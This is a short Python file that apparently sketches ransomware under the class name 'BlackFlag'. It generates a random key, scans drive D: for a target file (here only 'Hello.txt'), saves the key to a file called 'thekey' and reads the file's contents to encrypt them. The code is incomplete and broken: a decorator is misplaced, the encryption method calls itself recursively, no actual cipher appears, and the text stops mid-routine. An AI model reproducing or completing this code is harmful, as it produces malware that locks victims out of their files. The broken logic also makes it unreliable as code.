import os
import random 
import string

class BlackFlag:
        
        @classmethod
        
        
        def keyGenerator(self):
            global RandomKey
            KeyLength = 'This Needs To be 32 chars long:)'
            RandomKey = ''.join(random.choices(string.ascii_letters + string.digits, k=(32)))
            RandomKey = bytes(RandomKey, 'utf-8')            
                        
        def Encryption(data: bytes):
            global files
            global file 
            files = []
            for file in os.listdir('D:'):
                if file != 'Hello.txt':
                    continue
                
                files.append(file)
                print(files)
                with open('thekey', 'wb') as thekey:
                    thekey.write(RandomKey)
                    
                for file in files:
                    with open(file, 'rb') as thefile:
                        contents = thefile.read()
                        contentsEncrypted = BlackFlag(RandomKey).Encryption(contents)